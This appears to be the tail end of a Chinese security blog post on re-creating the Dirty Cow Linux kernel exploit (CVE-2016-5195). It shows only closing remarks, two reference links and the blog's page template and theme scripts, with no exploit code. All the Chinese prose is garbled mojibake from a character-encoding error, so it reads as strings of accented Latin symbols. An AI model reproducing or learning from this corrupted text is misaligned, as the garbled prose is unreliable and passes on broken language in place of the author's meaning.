<p>æœ¬æ¥æƒ³ç€è¿™ä¹ˆè€çš„æ´ï¼Œèƒ½ä¸èƒ½è¯•è¯•ä¸çœ‹åˆ«çš„å¸ˆå‚…çš„è§£æå’Œpocï¼Œè‡ªå·±ææ˜ç™½å¹¶æŠŠexpå†™å‡ºæ¥ğŸ˜­ğŸ˜­ğŸ˜­</p>
<p>ç»“æœå¤§å¤±è´¥å‘œå‘œå‘œğŸ¥µğŸ¥µğŸ¥µ</p>
<p>å›é¦–çœ‹8å¹´å‰çš„<strong>dirtycow</strong>ï¼Œç¬”è€…æ·±æ·±åœ°è¢«<code>Linux</code>å†…æ ¸åˆ©ç”¨ï¼Œè¿™é—¨<code>old school</code>çš„é»‘å®¢ç¾å­¦æŠ˜æœ</p>
<p>ç°åœ¨ç»ˆäºæ˜ç™½å°ä¸ƒå¸ˆå‚…è¯´çš„ï¼šå†…æ ¸åˆ©ç”¨çš„å‘å±•è·¯ç¨‹æœ¬èº«çš„é­…åŠ›å·²ç»è¶³å¤Ÿå¸å¼•äººï¼Œåœ¨æµ·è¾¹æ²™æ»©ä¸Šæ¡åˆ°ä¸€ä¸ªè´å£³å·²ç»è¶³å¤Ÿå¼€å¿ƒ: )</p>
<p>æœ›èƒ½ä¸æ–­åšæŒ: )</p>
<h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><p><a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/04/08/CVE-0X00-CVE-2016-5195/">ã€CVE.0x00ã€‘CVE-2016-5195 â€œè„ç‰›â€æ¼æ´å¤ç°åŠç®€è¦åˆ†æ - arttnba3â€™s blog</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/583209105">å‰–æè„ç‰›3_-proc-self-memæ˜¯æ€ä¹ˆå®ç°çš„ - çŸ¥ä¹ (zhihu.com)</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CVE/" class="category-chain-item">CVE</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/OS/" class="print-no-link">#OS</a>
      
        <a href="/tags/linux/" class="print-no-link">#linux</a>
      
        <a href="/tags/kernel/" class="print-no-link">#kernel</a>
      
        <a href="/tags/CVE/" class="print-no-link">#CVE</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CVE-2016-5195(Dirty Cow) Remake</div>
      <div>http://example.com/2024/02/27/dirtycow/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>korey0sh1</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2024å¹´2æœˆ27æ—¥</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>è®¸å¯åè®®</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/01/29/ret2hbp/" title="ret2hbp">
                        <span class="hidden-mobile">ret2hbp</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>ç›®å½•</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        æ€»è®¿é—®é‡ 
        <span id="busuanzi_value_site_pv"></span>
         æ¬¡
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        æ€»è®¿å®¢æ•° 
        <span id="busuanzi_value_site_uv"></span>
         äºº
      </span>
    
    
  
</div>

  
  
    <!-- å¤‡æ¡ˆä¿¡æ¯ ICP for China -->
    <div class="beian">
  <span>
    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
      äº¬ICPè¯123456å·
    </a>
  </span>
  
    
      <span>
        <a
          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678"
          rel="nofollow noopener"
          class="beian-police"
          target="_blank"
        >
          
            <span style="visibility: hidden; width: 0">|</span>
            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
          
          <span>äº¬å…¬ç½‘å®‰å¤‡12345678å·</span>
        </a>
      </span>
    
  
</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
